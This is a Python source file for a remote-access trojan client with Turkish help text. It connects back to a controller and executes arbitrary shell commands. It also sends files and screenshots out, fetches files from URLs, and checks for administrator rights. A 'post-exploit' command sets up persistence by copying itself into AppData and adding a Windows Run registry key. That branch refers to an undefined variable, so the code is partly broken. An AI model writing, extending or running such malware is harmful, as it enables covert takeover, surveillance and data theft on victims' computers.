import socket
import subprocess
import simplejson
import os
import base64
import shutil
import sys
import time
import requests
import colorama
from colorama import Fore, Back, Style
from mss import mss

class Client:
	def __init__(self, ip, port):
		self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.connection.connect((ip, port))

	def shell(self, command):
		try:
			if command[0] == "exit":
				self.connection.close()
				exit()
			elif command[0] == "cd" and len(command) > 1:
				os.chdir(command[1])
			elif command[0] == "download":
				with open(command[1], "rb") as r:
					return base64.b64encode(r.read())
			elif command[0] == "upload":
				with open(command[1], "wb") as w:
					w.write(base64.b64decode(command[2]))
					return f"{Fore.GREEN}{Style.BRIGHT}" + command[1] + f" uploaded!{Fore.RESET}{Style.RESET_ALL}"
			elif command[0] == "post-exploit":
				file_extension = os.environ["appdata"] + "\\" + command[2]
				if not os.path.exists(file_extension):
					shutil.copyfile(sys.executable, file_extension)
					reg = "reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v " + command[1] + " /t  REG_SZ /d " + dosya_uzantisi
					subprocess.call(reg, shell=True)
					return f"{Fore.CYAN}{Style.BRIGHT}POST-EXPLOITED!{Fore.RESET}{Style.RESET_ALL}"
			elif command[0] == "help":
				helps = ""
				helps += f"{Fore.CYAN}download {Fore.RESET}file_name -> Dosya indirme\n"
				helps += f"{Fore.CYAN}upload {Fore.RESET}file_name -> Dosya yukleme\n"
				helps += f"{Fore.CYAN}get {Fore.RESET}file_name -> Webden dosya indirme\n"
				helps += f"{Fore.CYAN}screenshot {Fore.RESET}file_name -> Ekran goruntusu alma\n"
				helps += f"{Fore.CYAN}check {Fore.RESET}file_name -> Yetki kontrolu\n"
				helps += f"{Fore.CYAN}exit {Fore.RESET}file_name -> Cikis\n"
				helps += f"{Fore.CYAN}post-exploit {Fore.RESET}file_name -> Kalicilik\n"
				return helps
			elif command[0] == "get":
				get_response = requests.get(command[1])
				file_name = command[1].split('/')[-1]
				with open(file_name, 'wb') as out_file:
					out_file.write(get_response.content)
					return f"{Fore.CYAN}{Style.BRIGHT}[+] File downloaded from specified URL.{Fore.RESET}{Style.RESET_ALL}"
			elif command[0] == "screenshot":
				with mss() as screenshot:
					screenshot.shot()
				with open('monitor-1.png', 'rb') as sc:
					foto = base64.b64encode(sc.read())
				os.remove('monitor-1.png')
				return foto
			elif command[0] == "check":
				if os.name == 'nt':
					try:
						temp = os.listdir(os.sep.join([os.environ.get('SystemRoot', 'C:\\Windows'), 'temp']))
					except:
						return f"{Fore.CYAN}{Style.BRIGHT}[!] User Privileges{Fore.RESET}{Style.RESET_ALL}"
					else:
						return f"{Fore.CYAN}{Style.BRIGHT}[+] Administrator Privileges{Fore.RESET}{Style.RESET_ALL}"
				else:
					return f"{Fore.RED}[!] {Fore.WHITE}{Style.BRIGHT}Bu isletim sistemi windows degil.{Fore.RESET}{Style.RESET_ALL}"
			else:
				return subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
		except Exception:
			return f"{Fore.BLUE}{Style.BRIGHT}[!] Error!{Fore.RESET}{Style.RESET_ALL}"

	def send_json(self, veri):
		paket = simplejson.dumps(veri)
		self.connection.send(paket.encode("utf-8"))

	def receive_json(self):
		res = ""
		while True:
			try:
				res = self.connection.recv(1024).decode("utf-8")
				return simplejson.loads(res)
			except ValueError:
				continue

	def pre_shell(self):
		while True:
			command = self.receive_json()
			veri = self.shell(command)
			self.send_json(veri)

		self.connection.close()

connection_kurma = Client("127.0.0.1", 8888)
connection_kurma.pre_shell()
